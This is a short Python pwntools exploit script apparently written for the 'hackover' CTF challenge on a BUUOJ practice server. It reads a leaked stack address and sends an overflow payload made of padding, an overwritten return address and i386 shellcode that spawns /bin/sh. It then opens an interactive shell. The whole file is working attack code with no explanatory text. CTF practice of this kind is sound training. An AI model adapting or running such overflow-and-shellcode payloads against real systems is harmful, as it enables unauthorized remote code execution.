from pwn import *
context(os='linux', arch='i386', log_level='debug')
p = remote('node4.buuoj.cn', 25681)
#p = process('./hackover')
elf = ELF('./hackover')
p.recvuntil('crash: ')

target = int(p.recvline()[:-1], 16)
print hex(target)
target -= 0x1c

p.recvuntil('> ')

pay = 'crashme\x00' + 'a'*18
#pay = pay.ljust(26, '\x00')
pay += p32(target)
pay += asm(shellcraft.i386.sh())
p.sendline(pay)

p.interactive()
